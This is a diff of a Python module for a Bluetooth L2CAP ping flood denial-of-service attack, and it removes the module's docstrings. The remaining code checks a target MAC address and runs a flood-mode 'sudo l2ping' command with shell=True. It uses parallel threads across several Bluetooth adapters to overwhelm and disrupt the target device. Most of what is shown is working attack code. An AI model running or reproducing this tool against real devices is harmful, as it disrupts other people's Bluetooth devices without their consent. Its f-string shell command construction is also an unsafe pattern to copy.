@@ -1,6 +1,4 @@
 """
-L2CAP Denial of Service Attack
-
 This module performs Bluetooth L2CAP ping flood attacks against target devices.
 It sends rapid L2CAP echo request packets to a target MAC address using multiple
 Bluetooth adapters to overwhelm and potentially disrupt the target device.
@@ -16,35 +14,13 @@ from ui import cprint, iprint, wprint, eprint, sprint, cinput, CYAN, YELLOW, RED
 
 
 class L2CAPDOSAttack:
-    """
-    Performs Bluetooth L2CAP denial of service attacks on target devices.
-    
-    Uses l2ping command to send rapid L2CAP echo request packets to a target
-    device, potentially causing denial of service or disruption.
-    """
-    
     def __init__(self, adapters):
-        """
-        Initialize the L2CAP DOS attack.
-        
-        Args:
-            adapters (list): List of HCI device identifiers (e.g., ["hci0", "hci1"]).
-        """
         self.adapters = adapters
         self.target_address = None
         self.packet_size = 600
         self.is_running = False
     
     def validate_target_address(self, address):
-        """
-        Validate Bluetooth MAC address format.
-        
-        Args:
-            address (str): MAC address in format XX:XX:XX:XX:XX:XX
-        
-        Returns:
-            bool: True if valid format, False otherwise.
-        """
         parts = address.split(':')
         if len(parts) != 6:
             return False
@@ -60,13 +36,6 @@ class L2CAPDOSAttack:
         return True
     
     def execute_l2cap_ping(self, adapter, target_mac):
-        """
-        Execute L2CAP ping command against target device.
-        
-        Args:
-            adapter (str): HCI device identifier (e.g., "hci0").
-            target_mac (str): Target Bluetooth MAC address.
-        """
         try:
             command = f"sudo l2ping -i {adapter} -s {self.packet_size} -f {target_mac}"
             subprocess.run(command, shell=True, timeout=None)
@@ -76,12 +45,6 @@ class L2CAPDOSAttack:
             eprint(f"Error executing l2ping on {adapter}: {e}")
     
     def run_attack(self):
-        """
-        Execute L2CAP ping flood attack on target device.
-        
-        Spawns parallel processes for each adapter to flood the target
-        with L2CAP echo request packets.
-        """
         import threading
         
         self.is_running = True
@@ -111,12 +74,6 @@ class L2CAPDOSAttack:
             pass
     
     def run_interactive(self):
-        """
-        Run the attack with interactive user input.
-        
-        Prompts user for target MAC address and packet size configuration.
-        """
-        
         cprint(f"Active adapters: {', '.join(self.adapters)}", WHITE)
         print()
         
